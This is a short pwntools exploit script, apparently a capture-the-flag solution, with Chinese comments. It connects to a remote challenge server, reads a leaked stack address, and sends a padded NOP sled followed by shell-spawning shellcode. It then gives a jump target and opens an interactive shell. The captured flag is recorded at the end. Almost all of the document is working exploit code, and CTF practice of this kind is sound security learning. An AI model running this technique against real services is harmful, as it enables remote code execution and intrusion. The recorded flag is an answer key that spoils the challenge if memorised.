from pwn import *

# 这题nx没开，给的是栈地址＋一个随机值（+-600多），这是要用到传说中的栈喷射吗？反正栈上写shellcode应该是没跑的
# 弄清楚栈布局，以及返回的地址的可能范围，然后用nop指令覆盖这个范围，后面接上shellcode即可。
context(os='linux', arch='amd64')
# context.log_level = 'debug'
p = remote('node4.buuoj.cn', 29795)

p.recvuntil(b'Current position: ')
stack_prob_addr = int(p.recvuntil(b'\n', drop=True), 16)
# p.info(hex(stack_prob_addr))

shellcode = asm(shellcraft.sh())
payload = b'a'*(668-0x25-0x10) + shellcode.rjust(1337+len(shellcode), asm(shellcraft.nop()))
# payload = shellcode.rjust(668-0x25-0x10+1337+len(shellcode), asm(shellcraft.nop()))
p.sendlineafter(b'What\'s your plan?\n> ', payload)
p.sendlineafter(b'Where do we start?\n> ', hex(stack_prob_addr+1337).encode())

p.interactive()
# flag{865f2e48-d443-4b1b-8560-9101a066bd47}